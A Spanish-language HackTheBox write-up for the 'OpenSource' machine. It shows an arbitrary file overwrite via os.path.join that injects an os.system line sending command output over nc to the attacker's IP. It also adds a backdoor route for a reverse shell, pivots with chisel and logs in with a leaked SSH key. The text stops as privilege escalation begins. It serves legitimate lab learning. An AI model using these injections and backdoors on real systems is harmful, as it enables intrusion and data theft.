---
layout      : post
title       : "HackTheBox - OpenSource"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471banner.png
category    : [ htb ]
tags        : [ code-analysis, docker, fortwarding, ssh-keys, pivoting, command-injection ]
---
Máquina Linux nivel fácil. Ojos abiertos revisando código **Python**, inyectamos comandos en ese código, encontramos credenciales volando, pivoteo sabroso con redirección de puertos y movimientos sensuales con **git hooks**.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471opensourceHTB.png" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**Creada por**: [irogir](https://www.hackthebox.eu/profile/476556).

Hay que abrir bien esos ojitos 👀

Encontraremos un servicio web que nos ofrece toda la estructura de su app, revisando su código fuente de **Python**, existe una funcionalidad para subir archivos que crea la ruta donde será alojado el archivo en el sistema con la subfunción `os.path.join`. La explotaremos para sobrescribir el objeto principal de la app y lograremos un `command-injection` bien lindo, lo usaremos para generar una sesión en su Docker como el usuario `root`.

La máquina cuenta con un puerto filtrado externamente y que únicamente conecta desde el Docker o desde el host, ese puerto cuenta con el servicio **Gitea**, pero para acceder a él es necesario contar con credenciales, usando la **command line interface (cli) de `git`** podremos ver los **commits** de toda la estructura de la app y entre ellos encontraremos unas credenciales, jugaremos también con un **port-fortwarding** para ver a **Gitea** de manera visual :P Usando las credenciales encontramos un backup del `/home` del usuario `dev01`, usaremos su llave privada para acceder al host.

Finalmente, existe un programa llamado `git-sync` que el usuario `root` ejecuta para validar cambios en `/home/dev01`, si existen los sube a un repositorio, para ello emplea estas funcionalidades de git: `status`, `add`, `commit` y `push`, jugaremos con el concepto de los **hooks** y haremos que cuando **root** -haga- el **commit** también -haga- el favor de ejecutar un comando por nosotros :P

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471rating.png" style="width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471statistics.png" style="width: 80%;"/>

Procesos reales, vulns reales, algo de jugueteo para estresarnos, pero bien!

> La idea inicial de esta locura es tener mis "notas" por si algun día se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) 😄 La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo la oportunidad de ayudarlos ¿por qué no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva más de enseñanza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

Two of us.

1. [Reconocimiento](#reconocimiento).
  * [Enumeración de puertos con nmap](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Damos un vistazo al servidor web](#puerto-80).
3. [Explotación](#explotacion).
4. [Gitea: Docker -> dev01](#fortwarding-gitea).
  * [Jugando con un port-fortwarding pa ver cositas de **Gitea**](#chisel).
5. [Escalada de privilegios](#escalada-de-privilegios).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

---

## Enumeración de puertos con nmap [📌](#enum-nmap) {#enum-nmap}

Vamos a empezar conociendo qué puertos (servicios) tiene expuestos la máquina a la que queremos atacar, para ello usaré `nmap`:

```bash
❱ nmap -p- --open -v 10.10.11.164 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función llamada **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://www.youtube.com/c/s4vitar) que me extrae los puertos en la clipboard |

De ese escaneo descubrimos los siguientes puertos:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Permite obtener una terminal (consola interactiva) de manera segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Un servidor (página) web. |

Para seguir profundizando en nuestro reconocimiento podemos usar nuevamente `nmap`, en este caso vamos a intentar ver la versión del software presente en cada puerto y además jugar con scripts (pequeños comandos) propios de **nmap** a ver si nos muestra algo más:

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, en este caso no es necesario (ya que tenemos pocos puertos), pero si tuviéramos varios evitamos tener que escribirlos uno a uno**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.11.164
    [*] Open ports: 22,80

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 22,80 -sC -sV 10.10.11.164 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Obtenemos algunas cositas relevantes:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 7.6p1 |
| 80     | HTTP     | Werkzeug/2.1.2 Python/3.10.3 |

Bien, tenemos versiones visibles y además servicios llamativos, pues empecemos a jugar y rompamos esta máquina.

# Enumeración [#](#enumeracion) {#enumeracion}

---

## Damos un vistazo al servidor web [📌](#puerto-80) {#puerto-80}

Demos un vistazo a la web:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471page80.png" style="width: 100%;"/>

Uyy, pues en el servicio de "transferencia de archivos entre amigos" hay varias cosas que llaman la atención:

```txt
* Podemos compartir archivos subidos mediante un link (interesante).
* Al ser un proyecto de codigo abierto pues contamos con el codigo fuente (boton Download)
  (posiblemente debamos abrir bien los ojos para encontrar algo a explotar).
* Y tambien tenemos la oportunidad de subir los dichosos archivos (boton Take me there!)
```

Descarguemos el código, damos clic en **Download** y obtenemos:

```bash
❱ ls
source.zip
```

Lo descomprimimos usando `unzip source.zip` y tendríamos muuuuchos objetos:

```bash
❱ ls
app  build-docker.sh  config  Dockerfile
```

Y encontramos una app de [flask](https://flask.palletsprojects.com/en/2.1.x/) y su código fuente:

```bash
❱ ls
configuration.py  __init__.py  __pycache__  static  templates  utils.py  views.py
```

Inspeccionando vemos algunas funcionalidades:

```bash
❱ cat views.py
```

```py
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

Ahí encontramos la funcionalidad de subir archivos (lo que habíamos referenciado antes) que visualmente sería esta:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471page80_upcloud.png" style="width: 100%;"/>

Viendo el código identificamos donde se guarda el objeto que subimos:

```py
...
file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
...
```

---

1. Tomará el nombre del archivo (`filename`).
2. Crea una ruta con la función [os.path.join](https://es.acervolima.com/python-metodo-os-path-join/).
3. Toma la ruta actual del sistema con [os.getcwd](https://www.tutorialspoint.com/python/os_getcwd.htm).
4. Concatena la carpeta `public`, `uploads` y el nombre del archivo.
5. Finalmente, quedaría algo así: `ACTUAL_PATH/public/uploads/FILENAME`.

Así que bien, sabemos al menos donde se están guardando los objetos internamente.

...

Si interactuamos con la subida de archivos intentando cualquier objeto, por ejemplo uno llamado `hola.txt` con contenido ***hola como estas*** obtenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471page80_upcloud_holaTXT_uploaded.png" style="width: 100%;"/>

Y si vamos a la URL vemos el contenido de nuestro objeto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471page80_uploads_holaTXT.png" style="width: 100%;"/>

Perfecto, esto nos puede dar una idea intensa: subir un objeto `.php` con contenido jugoso (como una reverse shell o algún intento de ejecutar comando remotamente) para que posteriormente la web al mostrarnos su contenido pueeeees lo ejecute, ¿no suena prometedor?

Probemos rápidamente con un objeto que al ejecutarse muestre por pantalla el resultado del comando `id`:

```bash
❱ cat test.php
<?php echo system('id'); ?>
```

Lo subimos y si peticionamos hacia el objeto tenemos esta triste noticia:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471page80_uploads_failRCEphp.png" style="width: 100%;"/>

Lo que hace en lugar de interpretar el objeto es descargarlo, así que nada, no es por acá:'(

...

Algo que también podemos probar es jugar con él -como- viajan los archivos y datos cuando se hace la subida, para esto podemos ayudarnos de [BurpSuite](https://openwebinars.net/blog/hacer-testeo-con-burp-suite/) que funciona como intermediador entre aplicaciones web, pues interceptemos la subida del archivo:

Tomamos el archivo de nuestro sistema, enviamos la petición y en **Burp** tenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471burp_req_upcloud_holaTXT.png" style="width: 100%;"/>

Bien, enviamos al **repeater** (para no tener que estar interceptando cada vez que queramos modificar algo en la petición) y empezamos a jugar... 

Está el nombre del archivo y su contenido, si modificamos el nombre, por ejemplo lo dejamos vacío, pasa esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471burp_req_upcloud_NULLfile.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471burp_res_upcloud_NULLfile.png" style="width: 100%;"/>

Tenemos errores por todo lado, un **SECRET** (debe ser el Token para firmar sesiones, de igual forma se guarda por si algo) y una ruta interesante que ya habíamos entendido antes:

> `ACTUAL_PATH/public/uploads/FILENAME`.

Nos muestra `/app` (que seria **ACTUAL_PATH**) y se concatenan `/public/uploads` y `""` (vacío, que seria **FILENAME**), por lo que el servidor intentara subir el nombre de archivo `/app/public/uploads/` y eso es una carpeta del sistema. Pero al menos ya sabemos donde estamos parados: `/app` (igual que la ruta del objeto `source.zip`).

Pasa lo mismo cuando intentamos ver el contenido de un archivo que aparentemente no exista en el servidor (esto mediante `/uploads`):

> Se los voy a mostrar de la forma linda, en Burp era muy seco :P

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471page80_uploads_invalidFileName.png" style="width: 100%;"/>

Sigamos a ver que más podemos encontrar y testear...

## Rabbit-Hole (Bypass ../) [📌](#rabbit-hole-LFI) {#rabbit-hole-LFI}

⚠️⚠️⚠️ **Si quieres evitar rabbit-holes e ir directo a la explotación da [clic aquí](#lfi-os-path-join)**.

En el código fuente también tenemos este objeto:

```bash
❱ cat utils.py
```

```py
...

"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""

def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

...

"""
Recursively replace a pattern in a string
"""

def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

Que apoyados de `views.py` toma sentido:

```py
...
from app.utils import get_file_name
...

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        ...
...

@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    ...
...
```

Ahí vemos como llama la función `get_file_name` del objeto `app.utils` (o sea, **utils.py**). Lo que hace esta función es muy sencillo, toma una cadena (en este caso el nombre del archivo a subir) y si esta contiene `../` en su nombre, lo reemplaza por `` (vacío), o sea que si intentamos subir un archivo con nombre: `../../../etc/passwd` el servidor lo subiría realmente con el nombre `etc/passwd` (: Esta sanitizacion la hace para evitar dos ataques: **Discovery Traversal** (ver archivos fuera de la ruta actual, o sea de todo el sistema) y **Local File Inclusion** (ver archivos únicamente de la ruta actual).

El tema es que gaste muuuucho tiempo intentando bypassear ese filtro para lograr ver archivos del sistema y nope, nada de nada, ¿te paso lo mismo?

## Rabbit-Hole (Obtener el verraco PIN) [📌](#rabbit-hole-PIN) {#rabbit-hole-PIN}

⚠️⚠️⚠️ **Si quieres evitar rabbit-holes e ir directo a la explotación da [clic aquí](#lfi-os-path-join)**.

Después de sufrir un buen rato me quedé con ganas y quise sufrir más :D

Descubriendo que objetos podría estar alojando el servidor web con algún fuzzer (`ffuf`, `wfuzz`, `dirsearch`, etc) encontramos la ruta `/console` con este output:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471page80_console.png" style="width: 100%;"/>

¿Recuerdas que habíamos visto algo sobre **Werkzeug** en nuestro escaneo de versiones? Pues acá nos topamos con su debugger, este nos permite ejecutar expresiones de Python interpretadas por **Werkzeug** más no directamente código **Python**, interesante solo que necesitamos un **PIN-CODE**...

> "Werkzeug is a comprehensive [WSGI](https://medium.com/@nachoad/que-es-wsgi-be7359c6e001) web application library." ~ [werkzeug.palletsprojects.com](https://werkzeug.palletsprojects.com/en/2.1.x/)

Buscando maneras de obtenerlo llegamos a [este post](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) de **Hacktricks** en el que se listan varias explotaciones contra **Werkzeug** y maneras de generar el **PIN**, pues me hundí en esa información intentando conseguir el **PIN** (además juntando el *rabbit-hole del LFI* para encontrar algunos archivos que pide) para finalmente seguir en ceros 😔

...

Así que decidí volver, revisar lo que tenía y **entenderlo**.

## El peligro de <u>os.path.join</u>[📌](#lfi-os-path-join) {#lfi-os-path-join}

Revisando línea por línea el funcionamiento del los archivos de la web, notamos algo interesante en internet con la subfunción `path.join` de la librería `os`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471google_twitter_tib3rius_osPATHjoin_question.png" style="width: 100%;"/>

Antes de ver la imagen de abajo, ¿cuál es tu respuesta?

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471google_twitter_tib3rius_osPATHjoin_response.png" style="width: 100%;"/>

* [Tib3rius discussion about **os.path.join** in Twitter](https://twitter.com/0xTib3rius/status/1345839975401738244).

UHHHHHHH qué brutalidad acabamos de encontrar! Hagamos un ejemplo práctico para terminar de entenderlo:

```py
import os

path = os.path.join("hola", "esta", "es", "la", "ruta")
print(path)
```

Lo ejecutamos y:

```bash
❱ python3 test_path_join.py 
hola/esta/es/la/ruta
```

Perfecto, todo normal, peeeeero si aplicamos lo dicho por **Tib3rius** y hacemos que uno de los directorios inicie con `/` tendríamos:

```py
path = os.path.join("hola", "esta", "es", "/la", "ruta")
```

```bash
❱ python3 test_path_join.py 
/la/ruta
```

EPAAAA! Efectivamente, `os.path.join` al encontrar un directorio con `/` al inicio la toma como ruta absoluta y obvia lo que tenga antes!!!!! 

Así que si tomamos el ejemplo real de la máquina podríamos obviar `/app/public/uploads` para que tome solo la ruta que le indiquemooooooos:

```py
file_name = "/etc/passwd"
file_path = os.path.join("ACTUAL", "public", "uploads", file_name)
```

```bash
❱ python3 test_path_join.py 
/etc/passwd
```

Si si si siii, pero tenemos que pensar esto:

> **Nosotros estamos subiendo archivos, por lo que si cambiamos el nombre del arcihvo `hola.txt` a `/etc/passwd`, probablemente estariamos sobre escribiendo el contenido del objeto `/etc/passwd`, así que hay que ir con cuidadito...**

# Explotación [#](#explotacion) {#explotacion}

Hagamos una prueba:

1. Subimos el archivo `hola.txt` con un contenido X.
2. Intentamos "subir" un archivo con el nombre `/app/public/uploads/hola.txt` (que sería el mismo que subimos antes) pero con otro contenido

Esto para validar si estamos modificando el archivo originalmente subido, si si, ya podemos jugar con los objetos de la propia web (`utils.py`, `views.py`, etc) para inyectar código **Python** que será ejecutado en la propia ejecución de la app :D

Este es el contenido de `hola.txt`:

```bash
❱ cat hola.txt
hola como estas
```

Apoyados de **BurpSuite** interceptamos la petición, la enviamos al **repeater** y sin modificar nada le damos clic a **Sent** (o sea, subimos el archivo), en teoría ya estaría en `/app/public/uploads`.

Ahora en el **repeater** cambiamos el `filename` de **hola.txt** a **/app/public/uploads/hola.txt** y el contenido nuevo será: **bien bien, muchas gracias! te juaquie?**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471burp_req_upcloud_ABSOLUTEPATHholaTXT.png" style="width: 100%;"/>

Damos clic en **Sent** para subirla, no nos reporta error y si revisamos el archivoooooooooooo en la weeeeb:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471page80_uploads_ABSOLUTEPATHholaTXT.png" style="width: 100%;"/>

PODEMOS SOBRESCRIBIR OBJETOSSSSSS! Ya con esto estamos es ganaos y podemos ir directamente a modificar el `views.py` para que cuando se suba un objeto ejecute un código "extra" por nosotros 😏

Tomamos el `views.py` que venía en el **source.zip** y lo subimos al servidor, pero interceptamos con Burp para jugar:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471burp_req_upcloud_viewsPYoriginal.png" style="width: 100%;"/>

Aún no hemos cambiado nada, peeeeero empecemos:

1. Cambiamos el **filename** de `views.py` a `/app/app/views.py` (esta ruta la sacamos tanto del **source.zip** como de nuestra enum anterior.
2. Agregamos una línea interesante dentro de la función `upload_file()`:
  
  ```py
  ...
  def upload_file():
    if request.method == 'POST':
    ...
    os.system('id; hostname | nc 10.10.14.7 4433')
    ...
  ```

  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471burp_req_upcloud_viewsPYidYhostname.png" style="width: 100%;"/>

  Esto lo que hará será enviar (si es que existe `nc`) el resultado del comando `id` y `hostname` al puerto **4433** del servidor **10.10.14.7**, o sea nuestra IP, levantemos ese puerto:

  ```bash
  ❱ nc -lvp 4433
  listening on [any] 4433 ...
  ```

> <span style="color: yellow;"> Así fue como yo lo hice en primer momento, pero despues encontre otra forma (abajo la digo) de evitar esto:</span> <span style="color: red;">Me di cuenta que esta modificación causa un error extraño y hace que el "**home**" de la web desaparezca y que ahora `/upcloud` se aloje en `/`</span> Ya veremos de que hablo...

Entonces lo que queremos lograr con esa modificación es sencillo, la subida del archivo alterara el objeto del sistema `/app/app/views.py` y una vez sea ejecutado (o sea, una vez se suba un objeto) llegaría a la línea que agregamos y ejecutaría los comandos :O

Hagámosle!

Damos clic en **Send** para modificar el archivo del sistema y la respuesta es favorable, peeeeero acá encontramos lo que referencie antes, por alguna razón se explota la ruta `/upcloud` y al intentar ejecutar nuestros comandos obtenemos que no existe la ruta:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471burp_res_upcloud_viewsPYidYhostname404.png" style="width: 100%;"/>

Solo que si ahora quitamos `/upcloud` de acá:

```txt
POST /upcloud HTTP/1.1
Host: 10.10.11.164
...
```

Obtenemos que el archivo se subió correctamente de nuevo PEEEEEEERO TAMBIEEEEEEEEEEEN:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471bash_rce_viewsPY_hostnameDocker.png" style="width: 100%;"/>

Vemos que la dirección IP **10.10.11.164** nos envió una petición con el contenido del comando `hostname` (el de **id** nop, quizás no le gusta concatenar) y efectivamente estamos en un Docker (lo sabemos por el nombre del hostname (random)), pero lo más importante: **TENEMOS RCEEEEE** (:

Obtengamos una **reverse shell (una terminal de comandos remota)** (: Pero ahora no rompamos nada para no dañar la experiencia de los demás :P

Quitamos la línea que agregamos en `upload_file()` y nos hacemos una nueva función al final del objeto:

```py
...
@app.route('/acaestalamagiaoculta')
def magia():
  os.system('COMMAND')
  return "ola emo jaqueau"
```

Con lo que al hacer una petición hacia `http://10.10.11.164/acaestalamagiaoculta` se ejecutaría el comando que coloquemos :D

* [Acá hay varias maneras de generar una reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).

Yo usaré la de [Netcat de toda la vida](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd), levantamos de nuevo el puerto **4433**, damos forma al payload:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471burp_req_upcloud_viewsPYrevsh.png" style="width: 100%;"/>

Subimos archivo y si vamos a la nueva rutaaaaaaaa y vemos nuestro listener:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471bash_rce_viewsPY_revsh.png" style="width: 100%;"/>

Estamos dentro del contenedor con una terminal (: A ver con que nos encontramos...

> Aprovechemos para automatizar esto y obtener una shell desde un script en python:
> [arbitrawrite_dockerce.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/opensource/arbitrawrite_dockerce.py)

---

# Port Forwarding: Docker -> dev01 [#](#fortwarding-gitea) {#fortwarding-gitea}

Después de muuuuuuuuuuuuuuuu(uuuuuu)cha enumeración sobre el contenedor y sin encontrar nada decidí volver a ver si es que nos estábamos dejando algo... Y sí.

Si nos fijamos el objeto `source.zip` tiene contenido de un repositorio de [Git](https://www.atlassian.com/es/git/tutorials/what-is-git):

```bash
❱ ls -lago
total 2440
drwxr-xr-x 1      96 may 24 19:47 .
drwxr-xr-x 1      28 may 24 19:47 ..
drwxrwxr-x 1      64 abr 28 06:45 app
-rwxr-xr-x 1     110 abr 28 06:40 build-docker.sh
drwxr-xr-x 1      32 abr 28 06:34 config
-rw-rw-r-- 1     574 abr 28 07:50 Dockerfile
drwxrwxr-x 1     144 may 25 23:13 .git
```

Si ingresamos podemos jugar con el histórico de commits (que serian los cambios por los que ha pasado el proyecto) y otras cositas llamativas, pero como forma de enumeración nos enfocaremos en eso:

```bash
❱ cd .git/
```

Usando el comando [git log](https://desarrolloweb.com/articulos/git-log.html) vemos los commits subidos de la [rama (branch)](https://www.atlassian.com/es/git/tutorials/using-branches) actual:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471bash_git_log_public_sourceZIP.png" style="width: 100%;"/>

Y si queremos ver los cambios con detalle de un commit en específico usamos [git show \<hash del commit\>](https://initialcommit.com/blog/git-show):

```bash
❱ git show 2c67a52253c6fe1f206ad82ba747e43208e8cfd9
```

Peeeero no encontramos nada relevante :/ Siguiendo vemos otra rama llamada `dev` (nosotros estamos en `public`):

```bash
❱ git branch
  dev
* public
```

Pues visualicemos los commits de esa nueva rama:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471bash_git_log_dev_sourceZIP.png" style="width: 100%;"/>

Y si vamos recorriendo uno a uno encontramos esta cosita extraña en el commit "added gitignore":

```bash
❱ git show be4da71987bbbc8fae7c961fb2de01ebd0be1997
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471bash_git_show_dev_credsPROXY.png" style="width: 100%;"/>

Tenemos dos cosas que me ponen a dudar: (1) Lo que parecen ser unas credenciales viajando mediante un proxy que usaba el objeto `settigs.json` y (2) ese proxy hace referencia a otra dirección IP con otro puerto a los que tenemos, esto me hizo pensar que deberíamos buscar ese puerto para algo, por ahora guarda las creds en tus notas.

Intentando jugar con esas credenciales con **ssh** y `dev01` como usuario no logramos nada y buscando ese puerto (o alguno distinto) internamente en el **Docker** tampoco hay nada... Pensando que quizás `nmap` no nos reportó algún puerto, volvemos a escanear, pero ahora sin argumentos, todo limpio (al no tener nada, por default hará peticiones contra los 1000 puertos más conocidos):

```bash
❱ nmap -vvv 10.10.11.164 -oG allScan
```

Yyyyyy encontramos un nuevo puerto:

```bash
3000/tcp filtered ppp     no-response
```

Con razón antes no había salido, está filtrado (puede ser algún firewall o bloqueo que evita verlo como abierto) y no es el mismo que estaba en el objeto `settings.json`, pero nos puede servir para ver que trata tanto interna como externamente (**nmap** no nos reporta nada distinto)...

```bash
❱ nc 10.10.11.164 3000
❱ curl http://10.10.11.164:3000
❱ wget http://10.10.11.164:3000
```

Pero no logramos respuesta alguna, pero en el Docker:

```bash
/tmp # wget http://10.10.11.164:3000
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471bash_dockerSH_wgetPORT3000.png" style="width: 100%;"/>

Opa, pues obtenemos respuestaaaaaaaaaaaaa! Así que de alguna forma el puerto se expone peeeero únicamente el **Docker** tiene acceso a él :O Dando un vistazo rápido al archivo que nos descargó (`index.html`) vemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471bash_dockerSH_catINDEXhtml_PORT3000_gitea.png" style="width: 100%;"/>

Está corriendo el servicio [**Gitea**](https://gitea.io/en-us/) que es un gestor de versiones de proyectos (así como **GitHub**, pero con sus [variaciones](https://docs.gitea.io/en-us/comparison/)) :O

## Jugando con un port-fortwarding [📌](#chisel) {#chisel}

La cosa es que no tenemos forma visual de interactuar con el servicio, pero eso no es problema, acá podemos usar la lindura del **port-fortwarding**:

> "Podemos definir Port Forwarding, como la asignación o re-envío de puertos para transmitir información a través de una red." ~ [culturacion.com](https://culturacion.com/que-es-port-forwarding/)

Así de sencillo, es la opción que tenemos de reasignar la información de un puerto a otro servidor (y puerto) de la red, por lo que lo usaremos para indicarle que tome el contenido del puerto `3000` del servidor `10.10.11.164` y lo re-envíe a un puerto de nuestra máquina atacante para así tener acceso completo a ese contenido desde nuestro sistema. Hay varias maneras, yo empleare [chisel](https://github.com/jpillora/chisel), en los releases descargamos el mismo binario:

* `chisel_1.7.7_linux_amd64.gz`.

Descomprimimos y renombramos para comodidad:

```bash
❱ gzip -d chisel_1.7.7_linux_amd64.gz 
❱ mv chisel_1.7.7_linux_amd64 chisel
```

Y procedemos a subirlo a la máquina víctima con ayuda de `netcat`, levantamos servidor que una vez alguien se conecte enviara el contenido del objeto `chisel`:

```bash
❱ nc -lvp 4434 < chisel 
listening on [any] 4434 ...
```

Y nos conectamos, dando un tiempo de espera de **5** segundos para no perder la shell y guardando el contenido de la conexión en un archivo llamado `chisel`:

```bash
/tmp # nc -w 5 10.10.14.97 4434 > chisel
```

Después de que tengamos de vuelta nuestra shell validamos integridad para saber si la data se corrompió en el viaje:

```bash
❱ md5sum chisel 
ca5184d43691ee8d8619377e600fa117  chisel
```

```bash
/tmp # md5sum chisel
ca5184d43691ee8d8619377e600fa117  chisel
```

(damos permisos de ejecución: `chmod +x chisel`)

* [Tunneling with Chisel and SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html) / **0xdf**.

Perfecto, para el reenvío de puertos necesitamos levantar primero el servidor (puerto) de nuestra máquina:

```bash
❱ ./chisel server -p 1111 --reverse
```

Con esto levantamos el puerto **1111** para que actúe como listener:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471bash_chisel_server.png" style="width: 100%;"/>

Y ahora vamos a la máquina víctima (el cliente que se conecta al servidor):

```bash
/tmp # ./chisel client 10.10.14.97:1111 R:3001:10.10.11.164:3000
```

Nos conectamos al servidor que levantamos (**10.10.14.97:1111**), con esto estamos en la red, ahora simplemente le decimos que tome el contenido del puerto **3000** de la IP **10.10.11.164** y reenvíe su contenido al puerto **3001** de nuestra máquina (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471bash_dockerSH_chisel_client.png" style="width: 100%;"/>

Recibimos en el listener:

```bash
... session#1: tun: proxy#R:3001=>10.10.11.164:3000: Listening
```

Por lo que deberíamos ver a **Gitea** en `http://localhost:3001`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471google_localhost3001_gitea.png" style="width: 100%;"/>

TAMOOOOO!

## Backups juguetones [📌](#gitea-backuphome) {#gitea-backuphome}

Si nos fijamos arriba a la derecha tenemos la posibilidad de iniciar sesión y registrarnos, ¿recuerdan que tenemos unas credenciales? Podríamos probarlas ahí, ¿no?:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471google_localhost3001_gitea_login.png" style="width: 100%;"/>

Y y y yy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471google_localhost3001_gitea_dashboard.png" style="width: 100%;"/>

Lindo, estamos adentro... Hay un repositorio llamado `home-backup` (nombre peligroso)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471google_localhost3001_gitea_repo_homeBackup.png" style="width: 100%;"/>

Una carpeta `.ssh`, a verla:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471google_localhost3001_gitea_repo_homeBackup_ssh.png" style="width: 100%;"/>

El par de llaves **SSH** :O :o :O Si la llave privada (`id_rsa`) tiene contenido, podemos usarla como método para iniciar sesión, ya que funciona como una contraseña:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471google_localhost3001_gitea_repo_homeBackup_ssh_idRsa.png" style="width: 100%;"/>

Pues lo tiene, copiamos su contenido, creamos un archivo con ese contenido en nuestra máquina, le damos los permisos necesarios (`chmod 700 <archivo>`) y ejecutamos:

```bash
❱ ssh dev01@10.10.11.164 -i dev01.id_rsa
```

Obtenemos finalmente la terminaaaaaal:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/opensource/471bash_ssh_dev01SH.png" style="width: 100%;"/>

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando distintos procesos internos encontramos estas tareas programadas usando la herramienta [pspy](https://github.com/DominicBreuker/pspy) (que hace eso, lista en tiempo real los procesos que se estén ejecutando y qué usuario los ejecuta):

```bash
dev01@opensource:/tmp/test$ ./pspy
```

Prestamos atención a cada proceso y encontramos esto:

